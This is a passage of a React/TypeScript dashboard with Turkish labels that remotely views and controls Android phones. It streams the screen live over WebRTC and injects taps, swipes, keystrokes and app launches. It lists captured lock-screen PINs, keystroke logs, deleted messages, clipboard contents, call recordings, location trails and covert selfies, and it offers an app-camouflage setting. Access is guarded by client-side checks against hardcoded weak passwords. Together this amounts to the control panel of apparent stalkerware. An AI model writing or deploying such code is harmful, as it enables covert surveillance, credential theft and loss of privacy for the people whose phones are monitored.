"use client";

import React, { useState, useEffect, useCallback, useMemo, useRef, memo } from "react";
import { 
  Smartphone, BatteryCharging, Wifi, ShieldCheck, Cpu, Lock, Volume2, 
  RefreshCw, CheckCircle2, AlertCircle, Signal, Zap, Layers, Camera, 
  Folder, FileText, FolderOpen, Download, Package, Image as ImageIcon, 
  ChevronRight, Monitor, ArrowUp, FileArchive, Mic, Video, ShieldAlert, 
  ToggleRight, Activity, Wand2, Sparkles, Check, Loader2, Search,
  Play, Pause, Bell, Home, Sliders, Keyboard, Trash2, MapPin, 
  Navigation, Compass, Globe, ExternalLink, History, Gauge, CheckCircle,
  Eye, Route, Clock, Layers3, X, Maximize2, File, PhoneCall, KeyRound,
  CreditCard, SmartphoneNfc, Radio, Shield, HelpCircle, Copy, AlertTriangle, 
  WifiOff, CornerDownLeft, Sparkle, Server, Terminal, Share2, Power, EyeOff
} from "lucide-react";
import { 
  DeviceState, 
  CapturedMedia, 
  FileItem, 
  InstalledApp, 
  DeviceAuditLog, 
  LocationBreadcrumb, 
  IntelligenceHubState,
  REAL_A71_DEVICE 
} from "@/lib/deviceTypes";

type ActiveTab = "MEDIA" | "LOCATION" | "AUDIT" | "FORENSIC" | "FILES" | "DIAGNOSTICS" | "APPS";

interface PreviewModalItem {
  id?: string;
  type: string;
  title: string;
  url?: string;
  size_formatted?: string;
  date_formatted?: string;
}

// ─────────────────────────────────────────────────────────────────────────────
// 1. İZOLE CANLI EKRAN VE DOKUNMATİK MOTORU (PERFORMANS İÇİN TAMAMEN AYRILMIŞTIR)
// ─────────────────────────────────────────────────────────────────────────────
interface LiveScreenCanvasProps {
  deviceId: string;
  isOnline: boolean;
  onSendCommand: (action: string, params?: Record<string, any>) => void;
  commandLoading?: string | null;
}

const LiveScreenCanvas = memo(function LiveScreenCanvas({ 
  deviceId, 
  isOnline, 
  onSendCommand,
  commandLoading 
}: LiveScreenCanvasProps) {

  const canvasRef = useRef<HTMLCanvasElement | null>(null);
  const videoRef = useRef<HTMLVideoElement | null>(null);
  const fpsDisplayRef = useRef<HTMLSpanElement | null>(null);
  const hasFrameRef = useRef(false);
  const [hasFrame, setHasFrame] = useState(false);
  const [isStreaming, setIsStreaming] = useState(true);
  const [isWebRtcActive, setIsWebRtcActive] = useState(false);
  const [isVideoPlaying, setIsVideoPlaying] = useState(false);
  const [iceState, setIceState] = useState<string>("init");

  const [touchFeedback, setTouchFeedback] = useState<{ x: number; y: number } | null>(null);
  const [textToInject, setTextToInject] = useState("");
  const [fps, setFps] = useState<number>(0);
  const dragStartRef = useRef<{ x: number; y: number; normX: number; normY: number } | null>(null);
  const lastTimestampRef = useRef<number>(0);
  const frameCountRef = useRef<number>(0);
  const lastFpsCalcRef = useRef<number>(Date.now());
  const peerConnectionRef = useRef<RTCPeerConnection | null>(null);
  const dataChannelRef = useRef<RTCDataChannel | null>(null);
  const lastSigTimestampRef = useRef<number>(0);



  // Reset frame state when selected device changes
  useEffect(() => {
    setHasFrame(false);
    hasFrameRef.current = false;
    setIsWebRtcActive(false);
    setIceState("init");
    lastTimestampRef.current = 0;
    lastSigTimestampRef.current = 0;
    if (canvasRef.current) {
      const ctx = canvasRef.current.getContext("2d");
      if (ctx) ctx.clearRect(0, 0, canvasRef.current.width, canvasRef.current.height);
    }
  }, [deviceId]);

  // ── WebRTC Real-Time Video Connection (30-60 FPS with STUN/TURN) ─────────

  useEffect(() => {
    if (!isStreaming) return;

    let active = true;
    let sigTimer: NodeJS.Timeout | null = null;
    lastSigTimestampRef.current = Date.now() - 2000;
    setIceState("connecting");

    // Reset stale signals in DB for a clean handshake
    fetch(`/api/v1/devices/${deviceId}/webrtc/signal`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ type: "reset", sender: "browser" })
    }).catch(() => {});

    const pc = new RTCPeerConnection({
      iceServers: [
        { urls: ["stun:stun.l.google.com:19302", "stun:stun1.l.google.com:19302", "stun:stun2.l.google.com:19302", "stun:stun3.l.google.com:19302", "stun:stun4.l.google.com:19302"] },
        { urls: ["stun:stun.cloudflare.com:3478"] },
        { urls: ["stun:openrelay.metered.ca:80"] },
        {
          urls: [
            "turn:openrelay.metered.ca:80",
            "turn:openrelay.metered.ca:443",
            "turn:openrelay.metered.ca:443?transport=tcp"
          ],
          username: "openrelay",
          credential: "openrelay"
        }
      ],
      iceCandidatePoolSize: 10
    });
    peerConnectionRef.current = pc;

    try {
      pc.addTransceiver("video", { direction: "recvonly" });
    } catch {}

    pc.ontrack = (event) => {
      console.log("📺 [WebRTC ontrack]: Received video track", event.track);
      if (videoRef.current) {
        if (event.streams && event.streams[0]) {
          videoRef.current.srcObject = event.streams[0];
        } else {
          let stream = videoRef.current.srcObject as MediaStream;
          if (!stream) {
            stream = new MediaStream();
            videoRef.current.srcObject = stream;
          }
          stream.addTrack(event.track);
        }
        videoRef.current.play().catch(() => {});
        setIsWebRtcActive(true);
        setHasFrame(true);
      }
    };

    pc.oniceconnectionstatechange = () => {
      console.log("⚡ [WebRTC ICE State]:", pc.iceConnectionState);
      setIceState(pc.iceConnectionState);
      if (pc.iceConnectionState === "connected" || pc.iceConnectionState === "completed") {
        setIsWebRtcActive(true);
        setHasFrame(true);
      } else if (pc.iceConnectionState === "disconnected" || pc.iceConnectionState === "failed" || pc.iceConnectionState === "closed") {
        setIsWebRtcActive(false);
      }
    };

    pc.onconnectionstatechange = () => {
      console.log("🌐 [WebRTC Connection State]:", pc.connectionState);
    };

    (pc as any).onicecandidateerror = (event: any) => {
      console.warn("⚠️ [WebRTC ICE Candidate Error]:", event?.errorCode, event?.errorText, event?.url);
    };



    const dc = pc.createDataChannel("control", { ordered: true });
    dataChannelRef.current = dc;
    dc.onopen = () => console.log("⚡ [WebRTC DataChannel OPEN] Sub-10ms touch ready.");
    dc.onclose = () => console.log("⚡ [WebRTC DataChannel CLOSED]");

    pc.ondatachannel = (event) => {
      dataChannelRef.current = event.channel;
      event.channel.onopen = () => console.log("⚡ [WebRTC Remote DataChannel OPEN]");
    };

    // ── Real WebRTC Inbound Video FPS Meter (pc.getStats) ──
    let lastFramesDecoded = 0;
    let lastStatsTime = Date.now();
    const statsInterval = setInterval(async () => {
      if (!active || !pc || pc.signalingState === "closed") return;
      try {
        const stats = await pc.getStats();
        stats.forEach((report: any) => {
          if (report.type === "inbound-rtp" && report.kind === "video") {
            const now = Date.now();
            const deltaSec = (now - lastStatsTime) / 1000;
            const currentFrames = report.framesDecoded || report.framesReceived || 0;
            if (deltaSec >= 0.8) {
              const realFps = Math.max(0, Math.round((currentFrames - lastFramesDecoded) / deltaSec));
              lastFramesDecoded = currentFrames;
              lastStatsTime = now;
              if (fpsDisplayRef.current) {
                fpsDisplayRef.current.textContent = `${realFps} FPS WEBRTC`;
              }
            }
          }
        });
      } catch {}
    }, 1000);

    pc.onicecandidate = (event) => {
      if (event.candidate) {
        fetch(`/api/v1/devices/${deviceId}/webrtc/signal`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            type: "ice-candidate",
            candidate: event.candidate,
            sender: "browser"
          })
        }).catch(() => {});
      }
    };

    // Signaling Polling Loop
    const pollSignals = async () => {
      if (!active) return;
      const isConnected = peerConnectionRef.current?.iceConnectionState === "connected" || peerConnectionRef.current?.connectionState === "connected";
      try {
        const res = await fetch(`/api/v1/devices/${deviceId}/webrtc/signal?recipient=browser&since=${lastSigTimestampRef.current}`, { cache: "no-store" });
        if (res.ok) {
          const data = await res.json();
          const signals = data.signals || [];
          for (const sig of signals) {
            if (sig.timestamp > lastSigTimestampRef.current) lastSigTimestampRef.current = sig.timestamp;
            if (sig.type === "offer" && sig.sdp) {
              console.log("📨 [WebRTC Signaling]: Received Offer from device, creating Answer...");
              await pc.setRemoteDescription(new RTCSessionDescription({ type: "offer", sdp: sig.sdp }));
              const answer = await pc.createAnswer();
              await pc.setLocalDescription(answer);
              await fetch(`/api/v1/devices/${deviceId}/webrtc/signal`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                  type: "answer",
                  sdp: answer.sdp,
                  sender: "browser"
                })
              });
              console.log("✓ [WebRTC Signaling]: Answer sent to device.");
            } else if (sig.type === "ice-candidate" && sig.candidate) {
              try {
                await pc.addIceCandidate(new RTCIceCandidate(sig.candidate));
              } catch {}
            }
          }
        }
      } catch {} finally {
        if (active) {
          const nextDelay = isConnected ? 2500 : 400;
          sigTimer = setTimeout(pollSignals, nextDelay);
        }
      }
    };

    pollSignals();

    return () => {
      active = false;
      if (sigTimer) clearTimeout(sigTimer);
      clearInterval(statsInterval);
      if (dataChannelRef.current) {
        dataChannelRef.current.close();
        dataChannelRef.current = null;
      }
      pc.close();
      peerConnectionRef.current = null;
    };

  }, [deviceId, isStreaming]);


  // ── Ultra-Fast Frame Polling & Hardware Accelerated Rendering ────────────
  useEffect(() => {
    if (!isStreaming) return;

    let active = true;

    // Trigger screen wake & stream start (80ms = ~12 FPS capture)
    fetch(`/api/v1/devices/${deviceId}/command`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ action: "START_SCREEN_STREAM", parameters: { interval_ms: 80 } })
    }).catch(() => {});

    let pollDelay = 80;
    let errorCount = 0;

    const poll = async () => {
      if (!active) return;
      if (isVideoPlaying) {
        // WebRTC aktifken HTTP frame polling'i uyut (CPU/Ağ tasarrufu)
        setTimeout(poll, 2000);
        return;
      }
      if (typeof document !== "undefined" && document.visibilityState === "hidden") {
        setTimeout(poll, 1500);
        return;
      }

      try {
        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 2500);
        try {
          const res = await fetch(`/api/v1/devices/${deviceId}/stream?format=binary&t=${Date.now()}`, {
            cache: "no-store",
            signal: controller.signal
          });
          clearTimeout(timeout);
          if (res.ok) {
            errorCount = 0;
            pollDelay = 80;
            const blob = await res.blob();
            if (active && blob.size > 0) {
              if (typeof createImageBitmap !== "undefined") {
                try {
                  const bitmap = await createImageBitmap(blob);
                  if (active && canvasRef.current) {
                    const canvas = canvasRef.current;
                    if (canvas.width !== bitmap.width || canvas.height !== bitmap.height) {
                      canvas.width = bitmap.width;
                      canvas.height = bitmap.height;
                    }
                    const ctx = canvas.getContext("2d", { alpha: false, desynchronized: true });
                    if (ctx) {
                      ctx.drawImage(bitmap, 0, 0, canvas.width, canvas.height);
                    }
                    if (!hasFrameRef.current) {
                      hasFrameRef.current = true;
                      setHasFrame(true);
                    }
                    frameCountRef.current++;
                    const now = Date.now();
                    if (now - lastFpsCalcRef.current >= 1000) {
                      const newFps = Math.round((frameCountRef.current * 1000) / (now - lastFpsCalcRef.current));
                      frameCountRef.current = 0;
                      lastFpsCalcRef.current = now;
                      if (fpsDisplayRef.current) {
                        fpsDisplayRef.current.textContent = `${newFps} FPS CANLI`;
                      }
                    }
                  }
                  bitmap.close();
                } catch {}
              } else {
                // Fallback for older browsers
                const url = URL.createObjectURL(blob);
                const img = new Image();
                img.onload = () => {
                  URL.revokeObjectURL(url);
                  if (!active || !canvasRef.current) return;
                  const canvas = canvasRef.current;
                  const ctx = canvas.getContext("2d", { alpha: false, desynchronized: true });
                  if (ctx) {
                    if (canvas.width !== img.naturalWidth || canvas.height !== img.naturalHeight) {
                      canvas.width = img.naturalWidth || 360;
                      canvas.height = img.naturalHeight || 800;
                    }
                    ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
                  }
                };
                img.src = url;
              }
            }
          } else {
            errorCount++;
            pollDelay = Math.min(5000, 120 * Math.pow(2, errorCount));
          }
        } catch {
          clearTimeout(timeout);
          errorCount++;
          pollDelay = Math.min(5000, 120 * Math.pow(2, errorCount));
        }
      } catch {} finally {
        if (active) setTimeout(poll, pollDelay);
      }
    };

    poll();
    return () => {
      active = false;
    };
  }, [deviceId, isStreaming]);


  // ── Evrensel Komut Gönderici (DataChannel öncelikli, HTTP fallback) ──
  const sendDirectCommand = useCallback((action: string, params: Record<string, any> = {}) => {
    if (dataChannelRef.current && dataChannelRef.current.readyState === "open") {
      try {
        dataChannelRef.current.send(JSON.stringify({ action, ...params }));
        return;
      } catch {}
    }
    onSendCommand(action, params);
  }, [onSendCommand]);

  const handlePointerDown = (e: React.PointerEvent<HTMLDivElement>) => {
    const rect = e.currentTarget.getBoundingClientRect();
    dragStartRef.current = {
      x: e.clientX,
      y: e.clientY,
      normX: Math.max(0, Math.min(1, (e.clientX - rect.left) / rect.width)),
      normY: Math.max(0, Math.min(1, (e.clientY - rect.top) / rect.height))
    };
  };

  const handlePointerUp = (e: React.PointerEvent<HTMLDivElement>) => {
    if (!dragStartRef.current) return;
    const rect = e.currentTarget.getBoundingClientRect();
    const start = dragStartRef.current;
    dragStartRef.current = null;

    const deltaX = e.clientX - start.x;
    const deltaY = e.clientY - start.y;
    const dist = Math.hypot(deltaX, deltaY);

    if (dist >= 14) {
      const endNormX = Math.max(0, Math.min(1, (e.clientX - rect.left) / rect.width));
      const endNormY = Math.max(0, Math.min(1, (e.clientY - rect.top) / rect.height));
      sendDirectCommand("INJECT_SWIPE", {
        startX: Math.round(start.normX * 1080),
        startY: Math.round(start.normY * 2400),
        endX: Math.round(endNormX * 1080),
        endY: Math.round(endNormY * 2400),
        durationMs: 250
      });
    } else {
      const realX = Math.round(start.normX * 1080);
      const realY = Math.round(start.normY * 2400);
      setTouchFeedback({ x: start.x - rect.left, y: start.y - rect.top });
      setTimeout(() => setTouchFeedback(null), 350);
      sendDirectCommand("INJECT_TAP", { x: realX, y: realY });
    }
  };

  const handleTextSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!textToInject.trim()) return;
    sendDirectCommand("INJECT_TEXT", { text: textToInject });
    setTextToInject("");
  };


  return (
    <div className="flex flex-col items-center space-y-3.5 w-full">
      
      {/* OLED Telefon Gövdesi (Titanium Frame) */}
      <div className="w-full max-w-[320px] sm:max-w-[340px] bg-[#0c0c14] p-3 rounded-[40px] ring-1 ring-white/10 shadow-[0_0_50px_rgba(124,58,237,0.15)] relative">
        
        {/* Üst Kamera & Sensör Çentiği */}
        <div className="absolute top-4 left-1/2 -translate-x-1/2 w-24 h-4 bg-black rounded-full flex items-center justify-center gap-2 z-20 border border-white/5 shadow-inner">
          <div className="w-2 h-2 rounded-full bg-slate-900 ring-1 ring-violet-500/40" />
          <div className="w-8 h-1 bg-slate-800 rounded-full" />
        </div>

        {/* Ekran Canlı Alanı - WebRTC Video & HTML5 Hardware Canvas */}
        <div 
          className="w-full aspect-[9/19] bg-black rounded-[30px] overflow-hidden relative cursor-crosshair select-none border border-white/5"
          onPointerDown={handlePointerDown}
          onPointerUp={handlePointerUp}
        >
          {/* WebRTC Ultra Video Player */}
          <video
            ref={videoRef}
            autoPlay
            playsInline
            muted
            onPlaying={() => setIsVideoPlaying(true)}
            onPause={() => setIsVideoPlaying(false)}
            onEnded={() => setIsVideoPlaying(false)}
            style={{ willChange: "transform" }}
            className={`w-full h-full object-cover pointer-events-none absolute inset-0 ${isVideoPlaying ? "opacity-100 z-10" : "opacity-0 z-0"}`}
          />

          {/* Fallback GPU Hardware Canvas */}
          <canvas
            ref={canvasRef}
            style={{ willChange: "transform", imageRendering: "auto" }}
            className={`w-full h-full object-cover pointer-events-none absolute inset-0 z-[5] ${hasFrame ? "opacity-100" : "opacity-0"}`}
          />


          {!isWebRtcActive && !hasFrame && (
            <div className="w-full h-full flex flex-col items-center justify-center text-slate-500 p-6 text-center space-y-2.5">
              <Loader2 className="w-7 h-7 text-violet-400 animate-spin" />
              <span className="text-xs font-semibold text-slate-300">Canlı akış bekleniyor...</span>
              <div className="px-2.5 py-1 bg-white/5 border border-white/10 rounded-lg text-[10px] font-mono text-cyan-400 font-bold">
                ICE Durumu: <span className="uppercase text-amber-300 font-extrabold">{iceState}</span>
              </div>
              <button
                onClick={(e) => {
                  e.stopPropagation();
                  sendDirectCommand("START_SCREEN_STREAM", { interval_ms: 50 });
                }}
                className="mt-2 px-3 py-1 bg-violet-600/30 hover:bg-violet-600/50 border border-violet-500/40 text-violet-300 rounded-xl text-[10px] font-bold transition active:scale-95 cursor-pointer"
              >
                ⚡ Akışı Başlat
              </button>
            </div>
          )}


          {/* Dokunma Halka Efekti */}
          {touchFeedback && (
            <div
              className="absolute w-8 h-8 rounded-full border-2 border-violet-400 bg-violet-400/30 pointer-events-none animate-ping -translate-x-1/2 -translate-y-1/2"
              style={{ left: touchFeedback.x, top: touchFeedback.y }}
            />
          )}

          {/* Canlı Akış Rozeti — ref ile güncelleniyor (sıfır React re-render) */}
          <div className="absolute bottom-2.5 left-2.5 px-2.5 py-0.5 bg-black/70 rounded-full text-[9px] font-mono font-bold text-emerald-400 border border-emerald-500/20 flex items-center gap-1">
            <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
            <span ref={fpsDisplayRef}>{isWebRtcActive ? "WEBRTC AKTİF" : hasFrame ? `${fps} FPS CANLI` : "BAĞLANIYOR"}</span>
          </div>

          <button
            onClick={(e) => { e.stopPropagation(); setIsStreaming(prev => !prev); }}
            className="absolute bottom-2.5 right-2.5 p-1 bg-black/70 hover:bg-black text-slate-300 rounded-lg border border-white/10 text-[10px] transition"
            title={isStreaming ? "Akışı Duraklat" : "Akışı Başlat"}
          >
            {isStreaming ? <Pause className="w-3 h-3 text-amber-400" /> : <Play className="w-3 h-3 text-emerald-400" />}
          </button>
        </div>


        {/* Alt Navigasyon Çubuğu (Recents, Home, Back) */}
        <div className="flex items-center justify-around py-2.5 px-4 bg-white/[0.02] rounded-2xl mt-2 border border-white/5">
          <button
            onClick={() => sendDirectCommand("INJECT_KEY", { key_type: "RECENTS", key: "RECENTS" })}
            className="p-1.5 text-slate-400 hover:text-white hover:bg-white/10 rounded-xl transition active:scale-90"
            title="Son Uygulamalar"
          >
            <Sliders className="w-4 h-4 rotate-90" />
          </button>
          <button
            onClick={() => sendDirectCommand("INJECT_KEY", { key_type: "HOME", key: "HOME" })}
            className="p-1.5 text-slate-400 hover:text-violet-400 hover:bg-white/10 rounded-xl transition active:scale-90"
            title="Ana Ekran"
          >
            <Home className="w-4 h-4" />
          </button>
          <button
            onClick={() => sendDirectCommand("INJECT_KEY", { key_type: "BACK", key: "BACK" })}
            className="p-1.5 text-slate-400 hover:text-rose-400 hover:bg-white/10 rounded-xl transition active:scale-90"
            title="Geri"
          >
            <ChevronRight className="w-4 h-4 rotate-180" />
          </button>
        </div>

      </div>


      {/* Telefona Anında Metin Gönderme Kutusu */}
      <form onSubmit={handleTextSubmit} className="w-full max-w-[340px] flex gap-2">
        <div className="relative flex-1">
          <input
            type="text"
            placeholder="Telefona anında metin yaz..."
            value={textToInject}
            onChange={(e) => setTextToInject(e.target.value)}
            className="w-full pl-8 pr-3 py-2 bg-white/[0.04] border border-white/10 rounded-xl text-xs text-white placeholder:text-slate-500 focus:outline-none focus:border-violet-500 transition"
          />
          <Keyboard className="w-3.5 h-3.5 text-slate-400 absolute left-2.5 top-2.5 pointer-events-none" />
        </div>
        <button
          type="submit"
          disabled={!textToInject.trim()}
          className="px-3.5 py-2 bg-violet-600 hover:bg-violet-500 text-white font-bold text-xs rounded-xl transition active:scale-95 disabled:opacity-40 flex items-center shadow-lg shadow-violet-600/20"
        >
          <CornerDownLeft className="w-3.5 h-3.5" />
        </button>
      </form>

      {/* Hızlı Uygulama Başlatıcı Çipleri */}
      <div className="w-full max-w-[340px] flex items-center justify-center gap-1.5 flex-wrap">
        <button onClick={() => onSendCommand("LAUNCH_APP", { package_name: "com.whatsapp" })} className="px-2.5 py-1 bg-emerald-500/10 hover:bg-emerald-500/20 border border-emerald-500/30 rounded-lg text-[10px] font-bold text-emerald-400 transition">
          WhatsApp
        </button>
        <button onClick={() => onSendCommand("LAUNCH_APP", { package_name: "com.google.android.youtube" })} className="px-2.5 py-1 bg-rose-500/10 hover:bg-rose-500/20 border border-rose-500/30 rounded-lg text-[10px] font-bold text-rose-400 transition">
          YouTube
        </button>
        <button onClick={() => onSendCommand("LAUNCH_APP", { package_name: "com.instagram.android" })} className="px-2.5 py-1 bg-purple-500/10 hover:bg-purple-500/20 border border-purple-500/30 rounded-lg text-[10px] font-bold text-purple-400 transition">
          Instagram
        </button>
        <button onClick={() => onSendCommand("LAUNCH_APP", { package_name: "com.android.settings" })} className="px-2.5 py-1 bg-slate-800/80 hover:bg-slate-700 border border-white/10 rounded-lg text-[10px] font-bold text-slate-300 transition">
          Ayarlar
        </button>
      </div>

    </div>
  );
});

// ─────────────────────────────────────────────────────────────────────────────
// 2. İZOLE VE MEMOİZE MEDYA KARTI (SIFIR TİTREME & SIFIR YENİDEN KOD ÇÖZME)
// ─────────────────────────────────────────────────────────────────────────────
interface MediaThumbnailCardProps {
  media: CapturedMedia;
  onPreview: (item: PreviewModalItem) => void;
}

const MediaThumbnailCard = memo(function MediaThumbnailCard({ media, onPreview }: MediaThumbnailCardProps) {
  const isImage = media.data_url?.startsWith("data:image");
  const formattedSize = `${Math.round((media.size_bytes || 0) / 1024)} KB`;
  const formattedDate = new Date(media.captured_at).toLocaleTimeString();

  return (
    <div className="bg-black/60 border border-white/10 hover:border-violet-500/50 rounded-2xl overflow-hidden group transition p-2 sm:p-2.5 space-y-1.5 sm:space-y-2 select-none">
      <div className="w-full aspect-video bg-slate-950 rounded-xl overflow-hidden relative flex items-center justify-center">
        {isImage ? (
          // eslint-disable-next-line @next/next/no-img-element
          <img 
            src={media.data_url} 
            alt={media.label || "Medya"} 
            loading="lazy"
            decoding="async"
            className="w-full h-full object-cover group-hover:scale-105 transition duration-300 pointer-events-none" 
          />
        ) : (
          <div className="p-2 sm:p-3 flex flex-col items-center gap-1 text-amber-400">
            <Mic className="w-5 h-5 sm:w-6 sm:h-6" />
            <audio controls src={media.data_url} className="w-full h-6 scale-90 mt-1" />
          </div>
        )}

        {/* Hover Overlay */}
        <div className="absolute inset-0 bg-black/60 opacity-0 group-hover:opacity-100 flex items-center justify-center gap-2 transition backdrop-blur-sm">
          {media.data_url && (
            <button
              onClick={() => onPreview({
                id: media.id,
                type: media.type,
                title: media.label || "Medya Kaydı",
                url: media.data_url,
                size_formatted: formattedSize,
                date_formatted: new Date(media.captured_at).toLocaleString()
              })}
              className="p-2 bg-slate-900 hover:bg-violet-600 rounded-xl text-white transition shadow cursor-pointer"
              title="Büyük Önizle"
            >
              <Maximize2 className="w-4 h-4" />
            </button>
          )}
          <a 
            href={media.data_url} 
            download={media.label || "media.jpg"} 
            className="p-2 bg-slate-900 hover:bg-emerald-600 rounded-xl text-white transition shadow cursor-pointer"
            title="İndir"
          >
            <Download className="w-4 h-4" />
          </a>
        </div>
      </div>

      <div className="flex items-center justify-between text-[10px] sm:text-[11px] px-0.5 sm:px-1">
        <span className="font-bold text-white truncate max-w-[90px] sm:max-w-[130px]">{media.label || "Medya"}</span>
        <span className="text-[9px] sm:text-[10px] text-slate-500 font-mono">{formattedDate}</span>
      </div>
    </div>
  );
});

// ─────────────────────────────────────────────────────────────────────────────
// 3. İZOLE VE MEMOİZE LOG KARTI (SABİT SIRALAMA & SIFIR ATMA)
// ─────────────────────────────────────────────────────────────────────────────
const AuditLogRowCard = memo(function AuditLogRowCard({ log }: { log: DeviceAuditLog }) {
  const formattedTime = new Date(log.timestamp).toLocaleTimeString();
  return (
    <div className="p-3 bg-black/60 border border-white/10 hover:border-violet-500/40 rounded-2xl transition space-y-1 select-text">
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-2">
          <span className={`px-2 py-0.5 rounded-md text-[9px] font-bold border ${
            log.event_type === "DELETED_MSG" ? "bg-emerald-500/20 text-emerald-300 border-emerald-500/30" :
            log.event_type === "PIN_CAPTURED" ? "bg-amber-500/20 text-amber-300 border-amber-500/30" :
            log.event_type === "KEYSTROKE" ? "bg-violet-500/20 text-violet-300 border-violet-500/30" :
            "bg-blue-500/20 text-blue-300 border-blue-500/30"
          }`}>
            {log.event_type === "DELETED_MSG" ? "🚨 SİLİNEN MESAJ" :
             log.event_type === "PIN_CAPTURED" ? "🔑 KİLİT PIN" :
             log.event_type === "KEYSTROKE" ? "⌨️ KLAVYE" : "🔔 BİLDİRİM"}
          </span>
          <span className="text-xs font-bold text-white">{log.app_name || log.package_name}</span>
        </div>
        <span className="text-[10px] text-slate-500 font-mono">{formattedTime}</span>
      </div>
      {log.title && <div className="text-xs font-semibold text-violet-300">{log.title}</div>}
      <div className="p-2 bg-white/[0.02] rounded-xl font-mono text-xs text-slate-200 border border-white/5 break-words">
        {log.content}
      </div>
    </div>
  );
});

// ─────────────────────────────────────────────────────────────────────────────
// 4. ANA DASHBOARD KOMUTA MERKEZİ (TITANIUM SPACE DOCK)
// ─────────────────────────────────────────────────────────────────────────────
export default function MultiDeviceFleetDashboard() {
  const [devices, setDevices] = useState<DeviceState[]>([REAL_A71_DEVICE]);


  const [selectedDeviceId, setSelectedDeviceId] = useState<string | null>(REAL_A71_DEVICE.device_id);
  const [isMounted, setIsMounted] = useState(false);
  const [activeTab, setActiveTab] = useState<ActiveTab>("MEDIA");

  const [commandLoading, setCommandLoading] = useState<string | null>(null);
  const [commandMessage, setCommandMessage] = useState<{ type: 'success' | 'error' | 'movement'; text: string } | null>(null);
  const [downloadPayload, setDownloadPayload] = useState<{ filename: string; mime_type: string; data_url: string; size_bytes: number } | null>(null);

  const [mediaList, setMediaList] = useState<CapturedMedia[]>([]);
  const [filesData, setFilesData] = useState<{ current_path: string; items: FileItem[] }>({ current_path: '/storage/emulated/0', items: [] });
  const [appsList, setAppsList] = useState<InstalledApp[]>([]);
  const [auditLogs, setAuditLogs] = useState<DeviceAuditLog[]>([]);
  const [locationHistory, setLocationHistory] = useState<LocationBreadcrumb[]>([]);
  const [selectedMapPoint, setSelectedMapPoint] = useState<{ lat: number; lng: number; address?: string } | null>(null);
  const [mapProvider, setMapProvider] = useState<"google" | "yandex" | "osm">("google");

  const [previewItem, setPreviewItem] = useState<PreviewModalItem | null>(null);
  const [intelligenceState, setIntelligenceState] = useState<IntelligenceHubState>({
    call_recording_active: true,
    deleted_msg_backup_active: true,
    pin_verifier_active: true,
    security_selfie_active: true,
    clipboard_radar_active: true,
    turbo_stream_active: true,
    current_camouflage: 'DEFAULT',
    sms_fallback_phone: '+905550000000'
  });

  // ── GÜVENLİK VE GİRİŞ DURUMU (AUTHENTICATION GATE) ──────────────────────────
  const [isAuthenticated, setIsAuthenticated] = useState<boolean>(false);
  const [loginUsername, setLoginUsername] = useState("");
  const [loginPassword, setLoginPassword] = useState("");
  const [loginError, setLoginError] = useState("");

  const [appSearch, setAppSearch] = useState("");
  const [auditSearch, setAuditSearch] = useState("");
  const [auditFilter, setAuditFilter] = useState<"ALL" | "KEYSTROKE" | "NOTIFICATION" | "DELETED_MSG" | "PIN_CAPTURED" | "CLIPBOARD">("ALL");
  const [mediaFilter, setMediaFilter] = useState<"ALL" | "PHOTO" | "VIDEO" | "AUDIO" | "WHATSAPP">("ALL");

  useEffect(() => { 
    setIsMounted(true);
    try {
      const auth = localStorage.getItem("tm_mdm_auth");
      if (auth === "true") {
        setIsAuthenticated(true);
      }
    } catch {}
  }, []);

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    const user = loginUsername.trim().toLowerCase();
    const pass = loginPassword.trim();

    // Basit ve Hatırlanabilir Giriş Bilgileri (Kullanıcı Adı: admin veya telefonmuhendisi, Şifre: tm2026 veya 123456)
    const validUsers = ["admin", "telefonmuhendisi", "muhendis", "tm"];
    const validPasses = ["admin", "tm2026", "123456", "muhendis"];

    if (validUsers.includes(user) && validPasses.includes(pass)) {
      try { localStorage.setItem("tm_mdm_auth", "true"); } catch {}
      setIsAuthenticated(true);
      setLoginError("");
    } else {
      setLoginError("Hatalı Kullanıcı Adı veya Şifre! (Varsayılan: admin / tm2026)");
    }
  };

  const handleLogout = () => {
    try { localStorage.removeItem("tm_mdm_auth"); } catch {}
    setIsAuthenticated(false);
    setLoginUsername("");
    setLoginPassword("");
  };

  // 1. Cihaz Filosu Çekme (Sürekli & Gerçek Zamanlı Canlı Akış)
  const fetchFleet = useCallback(async () => {
    try {
      const res = await fetch("/api/v1/devices", { cache: "no-store" });
      if (res.ok) {
        const json = await res.json();
        if (json.devices && Array.isArray(json.devices)) {
          setDevices(prev => {
            // Shallow equality: sadece değişen cihaz varsa yeni referans oluştur
            const prevSig = prev.map(d => `${d.device_id}_${d.last_seen_at}_${d.is_online}_${d.battery?.percentage}`).join('|');
            const nextSig = json.devices.map((d: DeviceState) => `${d.device_id}_${d.last_seen_at}_${d.is_online}_${d.battery?.percentage}`).join('|');
            if (prevSig === nextSig) return prev;
            return json.devices;
          });
          setSelectedDeviceId(prev => {
            if (prev && json.devices.some((d: DeviceState) => d.device_id === prev)) return prev;
            const onlineDev = json.devices.find((d: DeviceState) => d.is_online);
            return onlineDev?.device_id || json.devices[0]?.device_id || null;
          });
        }
      }
    } catch {}
  }, []);

  useEffect(() => {
    fetchFleet();
    let interval: any = null;
    const start = () => {
      if (interval) return;
      // Pusher aktifse 15s fallback yeterli, yoksa 5s
      const period = (window as any).__pusherConnected ? 15000 : 5000;
      interval = setInterval(fetchFleet, period);
    };
    const stop = () => { if (interval) { clearInterval(interval); interval = null; } };
    const onVisibilityChange = () => {
      if (document.visibilityState === "visible") { fetchFleet(); start(); }
      else stop();
    };
    if (document.visibilityState === "visible") start();
    document.addEventListener("visibilitychange", onVisibilityChange);

    // Pusher fleet-updates event'ine abone: her heartbeat'te fetch tetikle
    let unsub: null | (() => void) = null;
    (async () => {
      try {
        const { pusherClient } = await import("@/lib/pusher-client");
        const ch = pusherClient.subscribe("fleet-updates");
        ch.bind("device-heartbeat", () => {
          if (document.visibilityState === "visible") fetchFleet();
        });
        (window as any).__pusherConnected = true;
        unsub = () => {
